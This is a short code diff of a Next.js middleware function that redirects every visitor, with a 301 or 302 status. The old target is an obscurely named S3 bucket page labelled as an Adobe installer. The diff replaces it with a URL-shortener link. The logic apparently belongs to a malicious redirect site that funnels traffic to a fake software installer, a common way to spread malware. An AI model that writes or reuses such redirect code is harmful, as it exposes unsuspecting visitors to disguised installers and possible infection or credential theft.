@@ -41,14 +41,14 @@ export function middleware(request) {
   // Redirect when ?ad=ad
   if (adParam === 'ad') {
     return NextResponse.redirect(
-      'https://01239397-29832986727655662-5656156567-723635356223.s3.us-east-1.amazonaws.com/newppoio-jwejkjwe/Adobe_New/en/installer.html',
+      'https://bcqc.net/4avec3j',
       { status: 301 }
     )
   }
 
   // Default redirect
   return NextResponse.redirect(
-    'https://01239397-29832986727655662-5656156567-723635356223.s3.us-east-1.amazonaws.com/newppoio-jwejkjwe/Adobe_New/en/installer.html',
+    'https://bcqc.net/4avec3j',
     { status: 302 }
   )
 }
